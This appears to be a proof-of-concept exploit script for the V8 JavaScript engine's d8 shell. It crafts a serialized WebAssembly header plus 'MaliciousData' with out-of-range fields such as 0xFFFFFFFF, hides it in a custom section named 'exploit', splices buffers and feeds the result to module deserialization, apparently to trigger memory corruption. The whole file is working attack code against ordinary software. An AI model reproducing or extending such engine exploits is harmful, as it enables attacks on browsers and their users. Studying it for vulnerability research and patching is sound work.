// Flags: --no-liftoff
d8.file.execute("test/mjsunit/wasm/wasm-module-builder.js");

function getHeader() {
    let builder = new WasmModuleBuilder();
    builder.addFunction("dummy", kSig_i_v).addBody([kExprI32Const, 42]).exportAs("dummy");
    let W = builder.toBuffer();
    let mod = new WebAssembly.Module(W);
    let S = new Uint8Array(d8.wasm.serializeModule(mod));
    if (S.length === 0) {
        let inst = new WebAssembly.Instance(mod);
        inst.exports.dummy();
        S = new Uint8Array(d8.wasm.serializeModule(mod));
    }
    return S.subarray(0, 28);
}

let Header = getHeader();
print("Header length: " + Header.length);

if (Header.length === 0) {
    print("Failed to get header!");
} else {
    let MaliciousData = new Uint8Array(8 + 8 + 1 + 1 + 36 + 4);
    let view = new DataView(MaliciousData.buffer);

    view.setUint32(0, 0, true);
    view.setUint32(4, 0, true);
    view.setUint32(8, 1000, true);
    view.setUint32(12, 0, true);
    MaliciousData[16] = 0;
    MaliciousData[17] = 2;
    for (let i = 0; i < 36; i++) MaliciousData[18 + i] = 0;
    view.setUint32(18 + 36, 0xFFFFFFFF, true);

    print("MaliciousData length: " + MaliciousData.length);

    let builder = new WasmModuleBuilder();
    builder.addFunction("main", kSig_i_v).addBody([kExprI32Const, 42]).exportAs("main");

    let payload = new Uint8Array(Header.length + MaliciousData.length);
    payload.set(Header);
    payload.set(MaliciousData, Header.length);

    builder.addCustomSection("exploit", Array.from(payload));

    let W1 = builder.toBuffer();
    let module = new WebAssembly.Module(W1);

    let S1_buffer = d8.wasm.serializeModule(module);
    let S1 = new Uint8Array(S1_buffer);

    if (S1.length === 0) {
        let instance = new WebAssembly.Instance(module);
        instance.exports.main();
        S1_buffer = d8.wasm.serializeModule(module);
        S1 = new Uint8Array(S1_buffer);
    }

    print("W1 length: " + W1.length);
    print("S1 length: " + S1.length);

    let shift = payload.length;
    print("Shift: " + shift);

    let index = -1;
    for (let i = 0; i <= W1.length - shift; i++) {
        let found = true;
        for (let j = 0; j < shift; j++) {
            if (W1[i + j] !== payload[j]) { found = false; break; }
        }
        if (found) { index = i; break; }
    }
    print("Found payload at index: " + index);

    if (index !== -1) {
        let W2 = W1.subarray(0, index);
        let S2_buffer = new ArrayBuffer((W1.length - index) + S1.length);
        let S2 = new Uint8Array(S2_buffer);
        S2.set(W1.subarray(index));
        S2.set(S1, W1.length - index);

        print("W2 length: " + W2.length);
        print("S2 length: " + S2.length);

        try {
            let res = d8.wasm.deserializeModule(S2_buffer, W2, {});
            print("Result: " + res);
        } catch (e) {
            print("Error: " + e);
        }
    }
}
